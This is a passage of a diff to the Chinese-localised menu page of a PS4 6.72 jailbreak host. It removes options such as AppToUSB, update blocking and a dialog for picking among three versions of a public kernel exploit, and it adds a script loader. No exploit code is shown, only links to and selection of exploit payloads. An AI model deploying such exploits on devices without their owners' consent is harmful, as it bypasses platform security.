71.9 0 130.4-58.5 130.4-130.4C471.1 306 459.2 275 437.6 251zM101.7 79.5c26-8.6 61-13.4 98.6-13.4 37.6 0 72.6 4.7 98.6 13.4 23.7 7.9 34.3 17.2 34.3 23 0 5.8-10.6 15.1-34.3 23 -26 8.6-61 13.4-98.6 13.4 -37.6 0-72.6-4.7-98.6-13.4 -23.7-7.9-34.3-17.2-34.3-23C67.4 96.7 78 87.3 101.7 79.5zM63.7 146.5c25.9 17.9 78.3 29.2 136.7 29.2 58.4 0 110.8-11.3 136.7-29.2v31.5c0 11.6-13.9 24.4-37.1 34.3 -26.5 11.2-61.8 17.4-99.6 17.4 -37.7 0-73.1-6.2-99.5-17.4 -23.3-9.8-37.1-22.7-37.1-34.3L63.7 146.5 63.7 146.5zM200.3 409.9c-37.7 0-73.1-6.2-99.5-17.4 -23.3-9.8-37.1-22.6-37.1-34.2v-35.9c28 21.8 79.4 35.1 136.7 35.1 3.9 0 7.6-0.2 11.3-0.4 2.7 18.2 9.3 35.8 19.2 51.4C220.7 409.4 210.5 409.9 200.3 409.9zM211.5 320c-3.6 0.2-7.4 0.4-11.2 0.4 -37.7 0-73.1-6.2-99.5-17.4 -23.3-9.8-37.1-22.6-37.1-34.2v-36c27.9 21.8 79.4 35.1 136.7 35.1 10 0 20.4-0.5 31.6-1.6C221.2 282.4 214.2 300.8 211.5 320zM340.7 436.7c-54.3 0-98.6-44.2-98.6-98.6 0-54.3 44.2-98.6 98.6-98.6 54.3 0 98.6 44.2 98.6 98.6C439.2 392.5 395 436.7 340.7 436.7z"/></svg></a></div></div>
-				<div class="divExploitOption"><div class="divMenuHeader">AppToUSB</div><div class="divMenuBody"><a href="672_app2usb_index.html?xpl=x" onclick="this.href=this.href.split('?')[0]+'?xpl='+exploitVer"><svg onmouseover="showInfo('AppToUSB');" onmouseout="clearInfo();" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 286 286"><path d="M286 217.5c0-7.2-5.8-13-13-13H13c-7.2 0-13 5.8-13 13v52c0 7.2 5.8 13 13 13h260c7.2 0 13-5.8 13-13V217.5zM52 256.5H17v-27h35V256.5zM102 256.5H67v-27h35V256.5z"/><path d="M13.4 181.5h259.9c3.6 0 6.9-1.4 9-4.1 2.1-2.7 2.9-6.1 2.1-9.7l-34.8-152.7C248 8.4 241.6 3.5 234.9 3.5H51.8c-6.7 0-13.2 4.9-14.7 11.5L2.3 167.8c-0.8 3.5-0.1 7 2.1 9.6C6.5 180.1 9.8 181.5 13.4 181.5zM102.4 54.1c0.5-5.4 6.1-9.7 12.6-9.7 6.4 0 11.5 4.3 11.3 9.7 -0.2 4-3.2 7.6-7.4 9.2l-0.8 15 20 8.5 0.6-51.3h-7.4c-1.2 0-2.2-0.6-2.7-1.4 -0.5-0.8-0.4-1.8 0.3-2.6l12.1-12.7c0.6-0.6 1.5-0.9 2.4-0.9 1 0 1.9 0.3 2.4 0.9l12.1 12.6c0.7 0.7 0.8 1.8 0.3 2.6 -0.5 0.8-1.6 1.4-2.7 1.4h-7.4l0.5 41.8 19.6-8.3L167.6 56.5h-3.7c-1.8 0-3.3-1-3.4-2.5l-0.5-13.1c-0.1-1.4 1.3-2.4 3-2.4h16.7c1.7 0 3.2 1.1 3.4 2.4l1.3 13.1c0.1 1.5-1.2 2.5-3 2.5h-3.7l1.2 15.3c0.1 1.7-0.9 3.4-2.7 4.2l-27.4 11.6 0.3 30.4c8.5 2.4 15.1 10 15.5 19.4 0.5 11.8-9 21.9-21.2 21.9 -12.2 0-21.7-10-21.2-21.9 0.4-9.4 6.9-17 15.5-19.4l0.2-20.5 -27.9-12c-1.8-0.8-2.9-2.5-2.7-4.3l1.4-17.9C104.6 61.7 102 58.2 102.4 54.1z"/></svg></a></div></div>
-				<div class="divExploitOption"><div class="divMenuHeader">PS4 金手指</div><div class="divMenuBody"><a href="672_ps4trainer_index.html?xpl=x" onclick="this.href=this.href.split('?')[0]+'?xpl='+exploitVer"><svg onmouseover="showInfo('PS4 Trainer');" onmouseout="clearInfo();" xmlns='http://www.w3.org/2000/svg' viewBox='0 0 295.2 295.2'><path d='M38.1 26.2H52.4V40.5H47.6v9.5H61.9V16.7H38.1 33.3 9.5V50H38.1ZM28.6 40.5H19V26.2h9.5zm9.5 28.6H52.4V83.3H47.6v9.5H61.9V59.5H38.1 33.3 9.5V92.9H38.1ZM28.6 83.3H19V69h9.5zm9.5 28.6h14.3v14.3H47.6v9.5H61.9V102.4H38.1 33.3 9.5v33.3h28.6zm-9.5 14.3h-9.5v-14.3h9.5zm228.6-14.3h-9.5c-2.6 0-4.8-2.1-4.8-4.8h-9.5c0 7.9 6.4 14.3 14.3 14.3v4.8h9.5v-4.8c7.9 0 14.3-6.4 14.3-14.3 0-7.9-6.4-14.3-14.3-14.3h-9.5c-2.6 0-4.8-2.1-4.8-4.8 0-2.6 2.1-4.8 4.8-4.8h9.5c2.6 0 4.8 2.1 4.8 4.8h9.5c0-7.9-6.4-14.3-14.3-14.3v-4.8h-9.5v4.8c-7.9 0-14.3 6.4-14.3 14.3 0 7.9 6.4 14.3 14.3 14.3h9.5c2.6 0 4.8 2.1 4.8 4.8 0 2.6-2.1 4.8-4.8 4.8zm-4.8 28.6c23.6 0 42.9-19.2 42.9-42.9 0-23.6-19.2-42.9-42.9-42.9-23.6 0-42.9 19.2-42.9 42.9 0 23.6 19.2 42.9 42.9 42.9zm0-76.2c18.4 0 33.3 15 33.3 33.3 0 18.4-15 33.3-33.3 33.3-18.4 0-33.3-15-33.3-33.3 0-18.4 15-33.3 33.3-33.3zm-25.4 95.2h-55.6v-16.8l-14-9.4 14-9.4v-22.6c17.5-8.9 28.6-26.9 28.6-46.6 0-28.9-23.5-52.4-52.4-52.4-28.9 0-52.4 23.5-52.4 52.4 0 19.7 11.1 37.7 28.6 46.6v58.1H68.2C30.6 159.5 0 190.1 0 227.7v1.3c0 34.6 27.3 63.2 60.7 63.8 19.5 0.4 37.9-8.5 49.9-23.8h73.9c11.8 15.2 29.6 23.8 48.8 23.8 1.8 0 3.7-0.1 5.6-0.2 31.6-2.7 56.4-30.7 56.4-63.5v-1.2c0-37.7-30.6-68.4-68.2-68.4zM104.8 54.8c0-23.6 19.2-42.9 42.9-42.9 23.6 0 42.9 19.2 42.9 42.9 0 17-10.1 32.4-25.7 39.3l-2.9 1.2v23.6l-14.3 9.5v9.9l14.3 9.5v14l-14.3 9.5v9.9l10.5 7H133.3V159.5 95.3l-2.9-1.2C114.9 87.2 104.8 71.8 104.8 54.8Zm181 174.3h0c0 28-20.9 51.7-47.7 54.1-18.6 1.6-36.3-6.5-47.3-21.6l-1.4-2H105.8l-1.4 2c-10.1 14-26.3 22.2-43.5 21.8-28.3-0.5-51.4-24.9-51.4-54.3v-1.3c0-32.4 26.3-58.7 58.7-58.7h55.6v19h-19v9.5h19 47.6 19v-9.5H171.4v-2.5l-14-9.4 10.7-7.1h58.9c32.4 0 58.7 26.4 58.7 58.9zM147.6 50c9.2 0 16.7-7.5 16.7-16.7 0-9.2-7.5-16.7-16.7-16.7-9.2 0-16.7 7.5-16.7 16.7 0 9.2 7.5 16.7 16.7 16.7zm0-23.8c3.9 0 7.1 3.2 7.1 7.1 0 3.9-3.2 7.1-7.1 7.1-3.9 0-7.1-3.2-7.1-7.1 0-3.9 3.2-7.1 7.1-7.1zm57.1 185.7c-7.9 0-14.3 6.4-14.3 14.3 0 7.9 6.4 14.3 14.3 14.3 7.9 0 14.3-6.4 14.3-14.3 0-7.9-6.4-14.3-14.3-14.3zm0 19c-2.6 0-4.8-2.1-4.8-4.8 0-2.6 2.1-4.8 4.8-4.8 2.6 0 4.8 2.1 4.8 4.8 0 2.6-2.1 4.8-4.8 4.8zm42.9-4.8c0 7.9 6.4 14.3 14.3 14.3 7.9 0 14.3-6.4 14.3-14.3 0-7.9-6.4-14.3-14.3-14.3-7.9 0-14.3 6.4-14.3 14.3zm19 0c0 2.6-2.1 4.8-4.8 4.8-2.6 0-4.8-2.1-4.8-4.8 0-2.6 2.1-4.8 4.8-4.8 2.6 0 4.8 2.1 4.8 4.8zm-33.3 14.3c-7.9 0-14.3 6.4-14.3 14.3 0 7.9 6.4 14.3 14.3 14.3 7.9 0 14.3-6.4 14.3-14.3 0-7.9-6.4-14.3-14.3-14.3zm0 19c-2.6 0-4.8-2.1-4.8-4.8 0-2.6 2.1-4.8 4.8-4.8 2.6 0 4.8 2.1 4.8 4.8 0 2.6-2.1 4.8-4.8 4.8zm0-47.6c7.9 0 14.3-6.4 14.3-14.3 0-7.9-6.4-14.3-14.3-14.3-7.9 0-14.3 6.4-14.3 14.3 0 7.9 6.4 14.3 14.3 14.3zm0-19c2.6 0 4.8 2.1 4.8 4.8 0 2.6-2.1 4.8-4.8 4.8-2.6 0-4.8-2.1-4.8-4.8 0-2.6 2.1-4.8 4.8-4.8zm-162.5 33.3 7.1 14.3h26.8V211.9H78Zm13-4.8h11.3v9.5H83.9l-2.4-4.8zM47.6 242.3v26.8H76.2V242.3L61.9 235.2Zm19 5.9v11.3h-9.5v-11.3l4.8-2.4zM45.8 211.9H19v28.6h26.8l7.1-14.3zM39.9 231H28.6v-9.5h11.3l2.4 4.8zM76.2 210.1V183.3H47.6v26.8l14.3 7.1zM57.1 192.9h9.5v11.3l-4.8 2.4-4.8-2.4z'/></svg></a></div></div>
-				<div class="divExploitOption"><div class="divMenuHeader">离线缓存</div><div class="divMenuBody"><a href="ps4_672_offline_index.html"><svg onclick="return confirm('您是否要安装离线缓存以进行脱机浏览?')" onmouseover="showInfo('Offline');" onmouseout="clearInfo();" xmlns='http://www.w3.org/2000/svg' width='550' height='550' viewBox='0 0 549.8 549.8'><path d='M332.6 454.8c0 31.6-25.6 57.2-57.2 57.2S218.3 486.4 218.3 454.8c0-31.6 25.6-57.2 57.2-57.2S332.6 423.2 332.6 454.8zM365.2 254c-18-7.6-36.7-12.9-55.8-15.7l97.1 97.1 32-32C417.4 282.3 392.7 265.6 365.2 254zM177.4 257.7c-25.4 11.9-48.2 28.2-67.8 48.5l70.4 68.1c20.4-21.2 46.6-34.6 75-39L177.4 257.7zM61 141.1C39.1 155.6 18.7 172.2 0 190.9l69.2 69.2c18.9-18.8 40-34.9 62.9-47.8L61 141.1zM426.3 107.1c-47.8-20.1-98.6-30.3-150.9-30.3 -38.1 0-75.4 5.4-111.3 16.2l83.1 83.1c9.3-0.9 18.7-1.3 28.2-1.3 77.4 0 150.3 30 205.3 84.5l69-69.5C514 154.3 472.5 126.5 426.3 107.1zM33.3 77.7l382.6 382.6 39.8-39.8L73.1 37.8 33.3 77.7z'/></svg></a></div></div>
-				<div class="divExploitOption"><div class="divMenuHeader">屏蔽更新</div><div class="divMenuBody"><a href="672_disable_upd_index.html?xpl=x" onclick="this.href=this.href.split('?')[0]+'?xpl='+exploitVer"><svg onmouseover="showInfo('Disable Updates');" onmouseout="clearInfo();" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 426.67 426.67"><path d="m213.33 0c-117.87 0-213.33 95.467-213.33 213.33s95.467 213.33 213.33 213.33 213.33-95.466 213.33-213.33-95.467-213.33-213.33-213.33zm-170.67 213.33c0-94.293 76.373-170.67 170.67-170.67 39.467 0 75.627 13.547 104.53 35.947l-239.25 239.25c-22.4-28.907-35.946-65.067-35.946-104.53zm170.67 170.67c-39.467 0-75.627-13.547-104.53-35.947l239.25-239.25c22.4 28.907 35.947 65.067 35.947 104.53 0 94.294-76.373 170.67-170.67 170.67z"/></svg></a></div></div>
-				<div class="divExploitOption"><div class="divMenuHeader">恢复更新</div><div class="divMenuBody"><a href="672_enable_upd_index.html?xpl=x" onclick="this.href=this.href.split('?')[0]+'?xpl='+exploitVer"><svg onmouseover="showInfo('Enable Updates');" onmouseout="clearInfo();" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 477.87 477.87"><path d="m238.93 0c-131.96 0-238.93 106.97-238.93 238.93s106.97 238.93 238.93 238.93 238.93-106.97 238.93-238.93c-0.14-131.9-107.03-238.79-238.93-238.93zm0 443.73c-113.11 0-204.8-91.692-204.8-204.8s91.692-204.8 204.8-204.8 204.8 91.692 204.8 204.8c-0.122 113.06-91.742 204.68-204.8 204.8z"/><path d="m370.05 141.53c-6.614-6.388-17.099-6.388-23.712 0l-158.6 158.6-56.201-56.201c-6.548-6.78-17.353-6.967-24.132-0.419-6.78 6.548-6.967 17.353-0.419 24.132 0.137 0.142 0.277 0.282 0.419 0.419l68.267 68.267c6.664 6.663 17.468 6.663 24.132 0l170.67-170.67c6.548-6.779 6.36-17.583-0.42-24.131z"/></svg></a></div></div>
-			</div>			
-			
-			<div id="infoWrapper">			
-				<div class="divExploitInfo"><div class="divMenuHeader">信息</div><div class="divMenuBody"></div><div id="exploitInfo">请选择任意选项以获取详细信息.</div></div>
-			</div>			
-		</main>
-		<footer>
-			@c0d3m4st4 - &copy;<span id="year"></span><br>汉化 by 上帝之右手
-			<video id='beep' src='click.mp4' width='0' height='0' preload='auto'>
-		</footer>
-		<div id="exploitSelectorOverlay">
-			<div id="exploitSelectorDialog">
-				<div class="divMenuHeader">漏洞版本选择</div>
-				<div class="divMenuBody">
-					<div id="exploitSelectorInfoText">
-							不同的漏洞利用代码在某些主机上效果会更好, 请尝试所有代码并确定哪种代码更适合您. <br><br> 您在此处选择的任何内容都将应用于所有 payloads.<br><br>该选择页面仅显示一次, 因此, 如果要选择其他代码, 请从浏览器中清除缓存数据后就会再次出现.<br><br>
-							
-							<input type="radio" id="exploitVer1" name="exploitVer" value="672_jb_c-code" checked>
-							<label for="exploitVer1">sleirsgoevy's 的漏洞 - 8月5日 - 3f3ec8aaa5cb90068290e11537ad785cd523ee2e</label><br><br>
-							<input type="radio" id="exploitVer2" name="exploitVer" value="672_jb_c-code_alt1">
-							<label for="exploitVer2">sleirsgoevy's 的漏洞 - 8月5日 (Alt 1) - 874a3ecf424edaaf97b6e0d6ccfb075ec08ebc8e</label><br><br>
-							<input type="radio" id="exploitVer3" name="exploitVer" value="672_jb_c-code_alt2">
-							<label for="exploitVer3">sleirsgoevy's 的漏洞 - 8月5日 (Alt 2) - da315dbd6e5c1011a44c2dd7c480247d5624e404</label>							
-					</div><br><br>
-					<button id="saveSelectedExploitButton" type="button">保存选项</button></div>
-				</div>
-			</div>		
-		</div>		
-	</body>
-	
+}
+function preweb(){
+    var script = document.createElement('script');script.src = "frontend.js";document.getElementsByTagName('head')[0].appendChild(script);
+}
+</script>
+<script>
+parent.ldbar = ldbar;
+parent.msgs = msgs;
+parent.loader = loader;
+parent.done = done;
+parent.fail = fail;
+parent.ldbarx = ldbarx;
+parent.txt1 = txt1;
+parent.loaderx = loaderx;
+parent.donex = donex;
+parent.failx = failx;
+</script>
+</body>
 </html>
